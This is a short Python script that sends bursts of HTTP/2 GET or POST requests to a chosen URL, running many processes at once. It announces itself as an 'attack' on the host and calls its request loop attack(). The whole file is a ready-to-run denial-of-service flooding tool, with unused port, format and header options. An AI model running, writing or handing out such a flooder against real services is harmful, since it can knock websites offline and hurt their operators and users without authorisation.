#!/bin/python3

import sys
import time
import ssl
import httpx
import argparse
from multiprocessing import Process

# Initialize the argument parser
parser = argparse.ArgumentParser()

# Adding command line arguments
parser.add_argument('-t', '--target', type=str, required=True, help='Target URL')
parser.add_argument('-p', '--port', type=int, default=80, help='Port to be used (default: 80)')
parser.add_argument('-m', '--method', type=str, default="GET", help='HTTP method to be used (e.g., GET, POST)')
parser.add_argument('-P', '--process', type=int, default=1, help='Number of processes to spawn')
parser.add_argument('-r', '--request', type=int, default=1, help='Number of requests per process')
parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1 seconds)')
parser.add_argument('-D', '--data', type=str, default="", help='Request body in JSON format (e.g., "{"param": 1}")')
parser.add_argument('-f', '--format', type=str, default="data=data", help='Format of the request body (e.g., "data=data" for form-encoded or "json=data" for JSON).')
parser.add_argument('-H', '--header', type=str, default="", help='Custom headers for the request, formatted as a JSON string (e.g., "Authorization": "Bearer token", "Content-Type": "application/json").')

# Parse the arguments
args = parser.parse_args()

# Assigning the parsed arguments to variables
host = args.target
port = args.port
method = args.method.upper()  # Ensure the method is uppercase for consistency
num_process = args.process
num_requests = args.request
delay = args.delay
data = args.data

# Validate the URL scheme (http/https)
if not host.startswith("http://") and not host.startswith("https://"):
    print("[!] The target URL should start with 'http://' or 'https://'.")
    sys.exit(1)

# Display the attack initiation details
print(f"[#] Attack started on {host} || Port: {str(port)} || # Requests: {str(num_requests * num_process)}")

# Function to perform the request
def attack():
    for i in range(num_requests):
        with httpx.Client(http2=True) as client:
            # Choose request method based on input argument
            response = getRequest(client) if method == "GET" else postRequest(client)
            print(f"{response}")
            time.sleep(delay)  # Ensure there is a delay between each request

# Function to perform a GET request
def getRequest(client):
    try:
        return client.get(host, timeout=None)
    except httpx.RequestError as exc:
        return f"[!] An error occurred while making GET request: {exc}"

# Function to perform a POST request
def postRequest(client):
    try:
        return client.post(host, json=data, timeout=None)
    except httpx.RequestError as exc:
        return f"[!] An error occurred while making POST request: {exc}"

# Initialize the process list
lst_proc = []

# Spawn the specified number of processes
for i in range(num_process):
    # Creating a new process for the attack
    process = Process(target=attack, daemon=True)
    lst_proc.append(process)
    process.start()
    
    # Delay between starting each process to control the load
    time.sleep(delay)

# Join the processes to wait for them to complete
for proc in lst_proc:
    if proc.is_alive():
        proc.join()

